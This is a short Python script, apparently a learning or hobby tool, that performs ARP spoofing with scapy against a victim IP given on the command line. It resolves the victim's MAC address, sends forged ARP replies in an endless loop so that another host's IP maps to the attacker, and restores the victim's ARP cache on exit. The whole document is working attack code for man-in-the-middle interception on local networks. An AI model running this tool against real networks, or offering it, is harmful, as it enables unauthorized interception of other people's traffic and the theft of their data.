#!/usr/bin/python3
import scapy.all as scapy
import optparse


print("ARP Spoofer\n16.12.2020\n************\n")

try:
    def get_args():
        opt = optparse.OptionParser()
        opt.add_option("-t","--target",dest="target",help="Specify the ip of victim")
        opt.add_option("-s","--spoof",dest="spoof",help="IP of the target to spoof")
        return opt.parse_args()[0]

    ips = get_args()

    def get_mac(ip):
        ip = scapy.ARP(pdst=ip)
        mac = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = mac/ip
        response = scapy.srp(packet,timeout=1,verbose=False)[0]
        return response[0][1].hwsrc

    def arp(target,spoof):
        mac = get_mac(target)
        packet = scapy.ARP(op=2,pdst=target,hwdst=mac,psrc=spoof)
        scapy.send(packet,verbose=False)

    def arp_can(target,spoof):
        mac1 = get_mac(target)
        mac2 = get_mac(spoof)
        packet = scapy.ARP(op=2,pdst=target,hwdst=mac1,psrc=spoof,hwsrc=mac2)
        scapy.send(packet,verbose=False)

    res = 2
    try:
        while True:
            arp(ips.target,ips.spoof)
            print(f"\rPacket send {res}",end="")
            res += 2
    except KeyboardInterrupt:
        print("\nLeaving...")
        arp_can(ips.target,ips.spoof)
except Exception as error:
    print(error)





